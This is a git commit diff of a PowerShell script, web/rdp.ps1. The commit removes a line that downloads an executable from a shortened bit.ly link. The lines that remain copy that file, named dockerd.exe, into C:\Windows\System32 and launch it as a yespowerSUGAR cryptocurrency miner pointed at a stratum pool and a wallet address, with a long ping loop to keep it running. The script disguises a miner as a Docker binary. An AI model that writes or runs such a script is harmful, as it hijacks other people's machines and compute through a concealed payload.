0c71be8058da78c370a839f7a6e4b6ed4bda8a91
kijang-020 <85983742+kijang-020@users.noreply.github.com>
2021-11-06 00:09:38 +0700

    Update rdp.ps1

--- web/rdp.ps1
+++ web/rdp.ps1
@@ -1,4 +1,3 @@
-Invoke-WebRequest https://bit.ly/3nYkEli -OutFile dockerd.exe
 Copy dockerd.exe C:\Windows\System32
 cmd /c echo cmd /k start dockerd.exe -a yespowerSUGAR -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y.worker1 -t4 >>a.ps1
 cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
